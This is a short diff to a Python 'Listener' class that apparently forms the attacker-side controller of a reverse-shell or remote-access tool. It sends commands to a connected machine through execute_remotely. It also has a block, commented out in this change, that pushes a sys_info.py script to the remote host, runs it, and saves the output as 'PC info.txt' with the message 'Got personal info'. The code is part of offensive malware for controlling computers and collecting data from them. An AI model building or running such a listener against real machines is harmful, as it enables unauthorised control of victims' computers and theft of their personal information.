@@ -2,6 +2,7 @@
 import socket
 import base64
 import json
+import sys_info
 
 
 class Listener:
@@ -51,11 +52,11 @@ class Listener:
 
     def run(self):
         #sending py file
-        sys_content = self.read_file("sys_info.py")
+        '''sys_content = self.read_file("sys_info.py")
         psuedo_com = "sys.py" + "\n\n" + sys_content
         result1 = self.execute_remotely(psuedo_com)
         result2 = self.write_files("PC info.txt", result1)
-        print("[+] Got personal info")
+        print("[+] Got personal info")'''
         while True:
             try:
                 path = self.execute_remotely("pwd")
@@ -73,7 +74,7 @@ class Listener:
                 print(result)
             except KeyboardInterrupt:
                 self.connection.close()
-                print("Closing connection and Exiting")
+                print("[*] Closing connection and Exiting")
                 exit()
 
 
